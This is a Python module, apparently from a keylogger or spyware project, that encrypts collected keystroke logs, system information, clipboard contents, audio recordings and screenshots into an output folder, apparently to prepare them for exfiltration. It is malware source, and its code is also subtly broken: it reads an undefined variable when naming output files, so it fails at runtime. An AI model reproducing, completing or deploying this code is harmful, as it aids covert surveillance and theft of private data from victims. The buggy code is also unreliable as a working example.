from cryptography.fernet import Fernet
import os
import config

# List of files to encrypt
SOURCE_FILES = [
    "logs/keylog.txt",
    "logs/systeminfo.txt",
    "logs/clipboard.txt",
    "logs/audio.wav",
    "logs/screenshot.png"
]
OUTPUT_DIR = "logs/encrypted_data"

# Initialize the Fernet object with the secret key from config.py
fernet = Fernet(config.FERNET_KEY)

def encrypt_files():
    # Encrypts each file in SOURCE_FILES using Fernet symmetric encryption
    # and saves them in the OUTPUT_DIR.
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    for filepath in SOURCE_FILES:
        if os.path.exists(filepath):
            try:
                with open(filepath, "rb") as f:
                    data = f.read()
                    # Encrypt the data using Fernet
                    encrypted = fernet.encrypt(data)
                filename = os.path.basename(filename)
                output_path= os.path.join(OUTPUT_DIR, filename + "enc")
                
                # Write the encrypted data to the new file
                with open(output_path,"wb") as ef:
                    ef.write(encrypted)
                print(f"[INFO] Encrypted {filename} -> {output_path}")
            except Exception as e:
                print(f"[ERROR] Failed to encrypt {filepath}: {e} ")